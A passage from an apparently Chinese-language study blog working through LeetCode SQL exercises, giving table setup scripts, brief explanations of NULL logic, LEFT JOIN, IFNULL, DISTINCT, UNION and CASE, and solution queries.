<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Customer (id <span class="type">int</span>, name <span class="type">varchar</span>(<span class="number">25</span>), referee_id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Customer;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Jane&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;Alex&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;Bill&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;Zack&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;Mark&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103120439335.png" alt="image-20221103120439335"></p>

        <h3 id="知识点：-1"   >
          <a href="#知识点：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="NULL值判定"   >
          <a href="#NULL值判定" class="heading-link"><i class="fas fa-link"></i></a><a href="#NULL值判定" class="headerlink" title="NULL值判定"></a>NULL值判定</h4>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/find-customer-referee/solution/xun-zhao-yong-hu-tui-jian-ren-by-leetcode/" >寻找用户推荐人 - 寻找用户推荐人 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>MySQL 使用三值逻辑 —— TRUE, FALSE 和 UNKNOWN。任何与 NULL 值进行的比较都会与第三种值UNKNOWN做比较。这个“任何值”包括 NULL 本身！这就是为什么 MySQL 提供 IS NULL 和 IS NOT NULL 两种操作来对 NULL 特殊判断。</p>

        <h3 id="代码：-1"   >
          <a href="#代码：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM customer WHERE referee_id != 2 OR referee_id IS NULL;</span><br></pre></td></tr></table></div></figure>




        <h2 id="市场分析I"   >
          <a href="#市场分析I" class="heading-link"><i class="fas fa-link"></i></a><a href="#市场分析I" class="headerlink" title="市场分析I"></a>市场分析I</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Users (user_id <span class="type">int</span>, join_date <span class="type">date</span>, favorite_brand <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Orders (order_id <span class="type">int</span>, order_date <span class="type">date</span>, item_id <span class="type">int</span>, buyer_id <span class="type">int</span>, seller_id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Items (item_id <span class="type">int</span>, item_brand <span class="type">varchar</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Users;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2018-01-01&#x27;</span>, <span class="string">&#x27;Lenovo&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2018-02-09&#x27;</span>, <span class="string">&#x27;Samsung&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2018-01-19&#x27;</span>, <span class="string">&#x27;LG&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-05-21&#x27;</span>, <span class="string">&#x27;HP&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Orders;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-08-01&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2018-08-02&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-08-03&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-08-04&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2018-08-04&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2019-08-05&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Items;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Samsung&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Lenovo&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;LG&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;HP&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161138352.png" alt="image-20221103161138352"></p>

        <h3 id="知识点：-2"   >
          <a href="#知识点：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="left-join："   >
          <a href="#left-join：" class="heading-link"><i class="fas fa-link"></i></a><a href="#left-join：" class="headerlink" title="left join："></a>left join：</h4>
      <p>以左表为基础，从右表中选择对应条件的数据添加。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table1 left join table2</span><br></pre></td></tr></table></div></figure>

<p>这里即以<code>table1</code>为基础，从<code>table2</code>中选择对应条件数据</p>

        <h4 id="ifnull-x1-x2-函数："   >
          <a href="#ifnull-x1-x2-函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#ifnull-x1-x2-函数：" class="headerlink" title="ifnull(x1,x2)函数："></a>ifnull(x1,x2)函数：</h4>
      <p>如果 <code>x1</code> 为 <code>NULL</code>， 返回 <code>x2</code>，否则返回 <code>x1</code>。</p>

        <h3 id="代码：-2"   >
          <a href="#代码：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	users.user_id AS buyer_id,</span><br><span class="line">	users.join_date,</span><br><span class="line">	IFNULL(userBy.cnt,0) AS orders_in_2019</span><br><span class="line">FROM users</span><br><span class="line">LEFT JOIN(</span><br><span class="line">SELECT </span><br><span class="line">	buyer_id,</span><br><span class="line">	COUNT(buyer_id) AS cnt</span><br><span class="line">FROM orders</span><br><span class="line">WHERE orders.`order_date` BETWEEN &#x27;2019-01-01&#x27; AND &#x27;2019-12-31&#x27;</span><br><span class="line">GROUP BY buyer_id</span><br><span class="line">)userBy</span><br><span class="line">ON users.user_id = userBy.buyer_id</span><br></pre></td></tr></table></div></figure>


        <h2 id="查询近30天活跃用户数"   >
          <a href="#查询近30天活跃用户数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查询近30天活跃用户数" class="headerlink" title="查询近30天活跃用户数"></a>查询近30天活跃用户数</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (user_id <span class="type">int</span>, session_id <span class="type">int</span>, activity_date <span class="type">date</span>, activity_type ENUM(<span class="string">&#x27;open_session&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>, <span class="string">&#x27;scroll_down&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>));</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;scroll_down&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-25&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-25&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161349643.png" alt="image-20221103161349643"></p>

        <h3 id="知识点：-3"   >
          <a href="#知识点：-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="DISTINCT："   >
          <a href="#DISTINCT：" class="heading-link"><i class="fas fa-link"></i></a><a href="#DISTINCT：" class="headerlink" title="DISTINCT："></a>DISTINCT：</h4>
      <p>去重，直接当作函数用即可</p>

        <h3 id="代码：-3"   >
          <a href="#代码：-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">	Activity.`activity_date` <span class="keyword">AS</span> `<span class="keyword">day</span>`,</span><br><span class="line">	<span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span>(Activity.`user_id`)) <span class="keyword">AS</span> active_users</span><br><span class="line"><span class="keyword">FROM</span> Activity</span><br><span class="line"><span class="keyword">WHERE</span> Activity.`activity_date` <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-06-28&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-07-27&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Activity.`activity_date`</span><br></pre></td></tr></table></div></figure>




        <h2 id="树节点"   >
          <a href="#树节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#树节点" class="headerlink" title="树节点"></a>树节点</h2>
      <p>创建语句：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS Tree (id INT, p_id INT);</span><br><span class="line">TRUNCATE TABLE Tree;</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;1&#x27;, &#x27;None&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;2&#x27;, &#x27;1&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;3&#x27;, &#x27;1&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;4&#x27;, &#x27;2&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;5&#x27;, &#x27;2&#x27;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103172919993.png" alt="image-20221103172919993"></p>

        <h3 id="知识点：-4"   >
          <a href="#知识点：-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="union联合查询："   >
          <a href="#union联合查询：" class="heading-link"><i class="fas fa-link"></i></a><a href="#union联合查询：" class="headerlink" title="union联合查询："></a><code>union</code>联合查询：</h4>
      <p>将多个查询语句联合起来</p>
<p>这里首先分类为根节点、叶子节点、内部节点</p>
<ul>
<li><p>根节点：</p>
<p>是父节点为<code>NULL</code>的</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	id,</span><br><span class="line">	<span class="string">&#x27;root&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>内部节点</p>
<p>父节点和子节点都不是<code>NULL</code>，其中子节点不是<code>NULL</code>可以通过判断其他节点的父节点是不是该节点来确定。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Inner&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>叶子节点</p>
<p>和内部节点类似，子节点为<code>NULL</code>，存在父节点</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Leaf&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></div></figure></li>
</ul>
<p>然后将三个表联合起来，排个序即可</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	id,</span><br><span class="line">	<span class="string">&#x27;Root&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Inner&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> id,<span class="string">&#x27;Leaf&#x27;</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> p_id</span><br><span class="line">	<span class="keyword">FROM</span> tree</span><br><span class="line">	<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">	<span class="keyword">AND</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></div></figure>

<p><code>CASE语句</code>查询：</p>
<p>形式为<code>case-when-then-else-end</code></p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">	id,</span><br><span class="line">	<span class="keyword">CASE</span></span><br><span class="line">	    <span class="keyword">WHEN</span> p_id <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span> <span class="string">&#x27;Root&#x27;</span>           #root</span><br><span class="line">	    <span class="keyword">WHEN</span> id <span class="keyword">IN</span>(<span class="keyword">SELECT</span> p_id</span><br><span class="line">			<span class="keyword">FROM</span> tree</span><br><span class="line">			<span class="keyword">WHERE</span> p_id <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>)</span><br><span class="line">		    <span class="keyword">THEN</span> <span class="string">&#x27;Inner&#x27;</span>                        #<span class="keyword">inner</span></span><br><span class="line">	    <span class="keyword">ELSE</span> <span class="string">&#x27;Leaf&#x27;</span>                             #leaf</span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">AS</span> TYPE</span><br><span class="line"><span class="keyword">FROM</span> tree</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> id;</span><br></pre></td></tr></table></div></figure>


        <h2 id="合作过至少三次的演员和导演"   >
          <a href="#合作过至少三次的演员和导演" class="heading-link"><i class="fas fa-link"></i></a><a href="#合作过至少三次的演员和导演" class="headerlink" title="合作过至少三次的演员和导演"></a>合作过至少三次的演员和导演</h2>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> ActorDirector (actor_id <span class="type">int</span>, director_id <span class="type">int</span>, <span class="type">timestamp</span> <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> ActorDirector;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ActorDirector (actor_id, director_id, <span class="type">timestamp</span>) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span 